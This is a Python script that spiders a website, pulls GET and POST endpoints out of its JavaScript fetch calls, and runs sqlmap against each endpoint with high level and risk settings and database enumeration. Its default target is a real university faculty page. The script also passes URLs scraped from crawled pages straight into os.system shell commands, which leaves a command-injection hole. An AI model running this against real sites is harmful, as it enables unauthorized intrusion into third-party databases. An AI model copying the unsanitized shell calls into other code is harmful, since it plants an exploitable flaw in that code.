import argparse
import bs4
import os
import requests
from queue import Queue

FETCH_START = 'fetch("'
FETCH_END = ').then'
URL_END = ',{'
POST =  'method:"post"'
PARAMS_START = 'URLSearchParams({'
FLAGS = '--level=3 --risk=3 --batch --output-dir="output/%s" --dbs --random-agent'

# Part 1: spider input URL to find all website pages and scripts.
parser = argparse.ArgumentParser()
parser.add_argument("--url", help="the url to begin crawling at", default="https://www.cs.utexas.edu/people/faculty-researchers/chris-prosise")
parser.add_argument("--pages", help="the max number of pages to crawl", type=int, default=50)
args = parser.parse_args()
start = args.url
q = Queue()
q.put(start)
crawled_pages = set()
crawled_scripts = set()

while not q.empty():
    link = q.get()
    print('Crawling:', link)
    try:
        resp = requests.get(link, timeout=5)
        soup = bs4.BeautifulSoup(resp.text, features="html.parser")
        crawled_pages.add(link)
        if(len(crawled_pages) > args.pages):
            print('Max # of pages reached.')
            break
        # Crawl href links
        for url in soup.find_all('a', href=True):
            if url['href'].startswith('http://') or url['href'].startswith('https://'):
                q.put(url['href'])
            else:
                q.put(link + url['href'])
        # Crawl .js links
        for url in soup.find_all('script', src=True):
            if url['src'].startswith('http://') or url['src'].startswith('https://'):
                crawled_scripts.add(url['src'])
            else:
                crawled_scripts.add(link + url['src'])
    except:
        pass

urls = list(crawled_pages)
scripts = list(crawled_scripts)

# Part 2: extract parameterized get and post requests from pages.
gets = [url for url in urls if '?' in url]
posts = [] #tuple(url, data[], testable_params[]). 

for script in scripts:
    try:
        page = requests.get(script).text
        while FETCH_START in page:
            page = page[page.index(FETCH_START) + len(FETCH_START) - 1:]
            curr_fetch = page[: page.index(FETCH_END)]
            raw_url = curr_fetch[: curr_fetch.index(URL_END)] if URL_END in curr_fetch else curr_fetch
            url = ''
            while '"' in raw_url:
                end_idx = raw_url.find('"', raw_url.find('"') + 1)
                curr_text = raw_url[1:end_idx]
                raw_url = raw_url[end_idx + 1:]
                url += curr_text
                if url[-1:] == '=':
                    url += 'blah'
            if POST in curr_fetch and PARAMS_START in curr_fetch:
                data = []
                params = []
                body = curr_fetch[curr_fetch.index(PARAMS_START) + len(PARAMS_START):]
                body = body[:body.index('}')]
                for param in body.split(','):
                    name = param[:param.index(':')]
                    if '"' in param:
                        param = param[param.index('"') + 1:]
                        arg = param[: param.index('"')]
                        data.append(name + '=' + arg)
                    else:
                        data.append(name + '=blah')
                        params.append(name)
                posts.append((url, data, params))
            else:
                gets.append(url)
    except:
        pass

# Part 3: run sqlmap, output vulnerabilities.
for url in gets:
    os.system('sqlmap -u "' + url + '" ' + FLAGS % 'get')
for url, data, params in posts:
    os.system('sqlmap -u "' + url + '" --data="' + '&'.join(data) + '" -p "' + ','.join(params) + '" --method="POST" ' + FLAGS % 'post')
